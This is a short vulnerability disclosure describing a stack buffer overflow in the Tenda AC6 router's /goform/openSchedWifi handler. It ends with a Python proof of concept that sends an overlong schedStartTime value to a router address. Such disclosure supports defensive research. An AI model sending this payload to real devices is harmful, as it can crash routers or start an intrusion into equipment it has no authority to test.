# Bug Report: Buffer Overflow in Tenda AC6 15.03.06.50 Router
A critical stack-based buffer overflow vulnerability has been discovered in the Tenda AC6 router firmware version 15.03.06.50. The vulnerability exists in the `/goform/openSchedWifi` HTTP request handler and can be exploited by remote attackers to achieve code execution or cause denial of service through malformed HTTP requests.

## Vulnerability Details

### Product Information
- **Product**: Tenda AC6 Wireless Router
- **Affected Version**: 15.03.06.50
- **Download Source**: https://www.tendacn.com/material/show/103316
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
A buffer overflow exists in the HTTP request handler for the `/goform/openSchedWifi` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `schedStartTime`, `schedEndTime`.

![alt text](image-3.png)

![alt text](image.png)

## poc
![alt text](image-1.png)
![alt text](image-2.png)

## reproduce

```python
from pwn import *
import requests

def send_payload(url, payload):
    print("sending...")
    response = requests.get(url, params={'schedWifiEnable': '0', 'schedStartTime': payload})
    print(f"Response status code: {response.status_code}\nResponse body: {response.text}")

payload = 0x40 * b'A' + b'DOIT'

send_payload("http://10.10.10.1/goform/openSchedWifi", payload)
```